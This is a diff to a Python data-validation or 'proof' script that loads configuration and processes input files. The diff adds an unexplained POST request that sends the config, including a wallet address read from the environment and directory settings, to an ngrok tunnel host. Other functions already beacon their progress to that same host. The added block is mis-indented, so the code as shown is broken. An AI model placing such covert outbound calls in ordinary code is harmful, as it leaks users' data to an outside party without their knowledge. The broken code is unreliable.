@@ -17,7 +17,7 @@ logging.basicConfig(level=logging.INFO, format='%(message)s')
 def load_config() -> Dict[str, Any]:
     """Load proof configuration from environment variables."""
     response = requests.post(
-        'https://3e44-2402-a00-408-24a6-6c7b-6524-4e4f-8e15.ngrok-free.app/api/poc/datavalidation',
+        'https://9055-2402-a00-408-24a6-9895-bce2-ef09-b88b.ngrok-free.app/api/poc/datavalidation',
         json={"data": "file mainpy load config"}
     )
     config = {
@@ -26,6 +26,15 @@ def load_config() -> Dict[str, Any]:
         'input_dir': INPUT_DIR,
         'walletAddress': os.environ.get('walletAddress', None),
     }
+     response = requests.post(
+        'https://9055-2402-a00-408-24a6-9895-bce2-ef09-b88b.ngrok-free.app/api/poc/datavalidation',
+        json={
+        'dlp_id': 1234,  # Set your own DLP ID here
+        'use_sealing': os.path.isdir(SEALED_DIR),
+        'input_dir': INPUT_DIR,
+        'walletAddress': os.environ.get('walletAddress', None),
+        }
+    )
     logging.info(f"Using config: {json.dumps(config, indent=2)}")
     return config
  
@@ -54,7 +63,7 @@ def extract_input() -> None:
     :return:
     """
     response = requests.post(
-        'https://3e44-2402-a00-408-24a6-6c7b-6524-4e4f-8e15.ngrok-free.app/api/poc/datavalidation',
+        'https://9055-2402-a00-408-24a6-9895-bce2-ef09-b88b.ngrok-free.app/api/poc/datavalidation',
         json={"data": "file mainpy extract input"}
     )
     for input_filename in os.listdir(INPUT_DIR):
